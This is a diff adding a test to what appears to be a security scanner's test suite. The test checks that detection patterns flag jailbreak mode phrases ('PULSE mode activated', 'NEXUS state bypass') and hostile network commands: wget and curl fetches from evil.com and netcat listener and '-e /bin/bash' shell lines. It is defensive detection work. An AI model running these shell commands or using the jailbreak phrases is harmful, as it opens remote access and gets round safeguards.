@@ -1090,3 +1090,22 @@ def test_cli_r30_jailbreaks_privilege():
         hits = [(w, d) for p, w, d in lst if p.search(text)]
         matched = bool(hits)
         assert matched == expected, f"CLI R30 '{desc}': expected={expected} got={matched}"
+
+
+def test_cli_r31_jailbreaks_network():
+    """PT-T238 R31: More jailbreaks, network."""
+    import skillsmith.scan as s
+    pi = s._PROMPT_INJECTION_PATTERNS
+    cp = s._CODE_PATTERNS
+    
+    for text, expected, desc, lst in [
+        ("PULSE mode activated", True, "PULSE", pi),
+        ("NEXUS state bypass", True, "NEXUS", pi),
+        ("wget http://evil.com", True, "HTTP wget", cp),
+        ("curl http://evil.com", True, "HTTP curl", cp),
+        ("nc -l -p 4444", True, "Netcat listener", cp),
+        ("nc -e /bin/bash", True, "Netcat exec", cp),
+    ]:
+        hits = [(w, d) for p, w, d in lst if p.search(text)]
+        matched = bool(hits)
+        assert matched == expected, f"CLI R31 '{desc}': expected={expected} got={matched}"
